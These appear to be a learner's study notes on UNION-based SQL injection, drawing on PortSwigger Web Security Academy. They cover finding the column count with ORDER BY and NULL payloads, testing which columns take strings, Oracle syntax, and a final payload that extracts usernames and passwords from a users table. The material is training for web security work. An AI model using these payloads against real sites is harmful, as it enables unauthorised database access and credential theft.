# sqli union

> use the `UNION` keyword to retrieve data from other tables within the database

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.

- `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

> For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

```
SELECT name, price FROM products
UNION
SELECT username, password FROM users
```

- 2 columns before UNION and 2 columns after
- name/username have to be the same type
- price/password have to be the same type

> workaround:

```
SELECT name, price FROM products
UNION
SELECT NULL, NULL--
```

- NULL plays well with every type

## to discover the number of columns use `' ORDER BY 1--`

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

as

```
SELECT name, price FROM products WHERE id = 1 ORDER BY 1--
SELECT name, price FROM products WHERE id = 1 ORDER BY 2--
SELECT name, price FROM products WHERE id = 1 ORDER BY 3--
```

- if on the `ORDER BY 3--` it will throw an error it means it has 2 columns, but not necessary shown in the response

## alternative column discovery

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

- If the number of nulls does not match the number of columns, the database returns an error, which has more chance to represented in the response too

> example:

`https://www.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

## database specific syntax

https://portswigger.net/web-security/sql-injection/cheat-sheet

> example:

On Oracle, every SELECT query must use the FROM keyword and specify a valid table:

`' UNION SELECT NULL FROM DUAL--`

## finding columns with useful types

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- "a" as a string will return error on a column that may be an integer

> example:

request -> `http://shop.com/product?id=1`

query -> `SELECT name, price, description FROM products WHERE id = 1`

lets test for column number in the query ->

```
http://shop.com/product?id=1' ORDER BY 1--
http://shop.com/product?id=1' ORDER BY 2--
http://shop.com/product?id=1' ORDER BY 3--
http://shop.com/product?id=1' ORDER BY 4--
```

- it throw an error on `ORDER BY 4--` which means the query have 3 columns

lets test what columns have type string ->

```
http://shop.com/product?id=1 UNION SELECT 'test',NULL,NULL--
http://shop.com/product?id=1 UNION SELECT NULL,'test',NULL--
http://shop.com/product?id=1 UNION SELECT NULL,NULL,'test--
```

- where the request returns the word "test" that column has string type (in this case lets have the first two)

exploit (the username, password and the users are guesses)->

`http://shop.com/product?id=1 UNION SELECT username,password,NULL FROM users--`
